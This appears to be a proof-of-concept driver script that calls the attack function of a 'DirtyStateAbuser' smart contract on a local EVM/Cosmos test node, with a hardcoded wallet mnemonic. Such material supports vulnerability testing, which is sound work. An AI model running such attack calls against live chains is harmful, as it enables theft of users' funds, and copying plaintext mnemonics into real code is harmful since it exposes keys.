import { HDNodeWallet, JsonRpcProvider } from "ethers";
import { DirtyStateAbuser__factory } from "../../typechain-types";

// connects to local node
const jsonRpcProvider = new JsonRpcProvider("http://localhost:8545");

// mnemonic for the HD wallet
const mnemonic = "guard cream sadness conduct invite crumble clock pudding hole grit liar hotel maid produce squeeze return argue turtle know drive eight casino maze host"
const owner = HDNodeWallet.fromPhrase(mnemonic, "", "m/44'/118'/0'/0/0").connect(jsonRpcProvider)

// get command line arguments
const COMMAND_LINE_ARGS = process.argv.slice(2)
const attackContract = COMMAND_LINE_ARGS[0]
const sendRecipient = COMMAND_LINE_ARGS[1]
const bech32Recipient = COMMAND_LINE_ARGS[2]

async function main() {
  const contract = DirtyStateAbuser__factory.connect(attackContract, owner)
  console.log("contract address: ", await contract.getAddress())

  // transfer 100 tokens to another address
  const txResponse = await contract.attack(sendRecipient, bech32Recipient)
  console.log("tx: ", txResponse)
  const txReceipt = await jsonRpcProvider.waitForTransaction(txResponse.hash)
  console.log("txReceipt: ", txReceipt)
}

main()